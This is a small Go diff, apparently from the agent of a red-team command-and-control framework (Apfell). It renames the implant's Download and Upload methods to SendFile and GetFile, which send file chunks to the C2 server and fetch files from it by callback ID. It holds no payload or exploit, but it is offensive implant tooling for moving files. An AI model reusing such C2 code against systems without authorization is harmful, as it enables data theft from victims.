@@ -352,8 +352,8 @@ func (c *C2Default) NegotiateKey() string {
 	return sessionID
 }
 
-//Download - download a file
-func (c *C2Default) Download(task structs.Task, params string) {
+//SendFile - download a file
+func (c *C2Default) SendFile(task structs.Task, params string) {
 	//response := TaskResponse{}
 	fileReq := structs.FileRegisterRequest{}
 	fileReq.Task = task.ID
@@ -381,8 +381,8 @@ func (c *C2Default) Download(task structs.Task, params string) {
 	c.SendFileChunks(task, raw)
 }
 
-//Upload the data
-func (c *C2Default) Upload(task structs.Task, fileid string) []byte {
+//GetFile the data
+func (c *C2Default) GetFile(task structs.Task, fileid string) []byte {
 
 	url := fmt.Sprintf("api/v1.3/files/%s/callbacks/%d", fileid, c.ApfellID)
 	encfileData := c.htmlGetData(fmt.Sprintf("%s/%s", c.BaseURL, url))
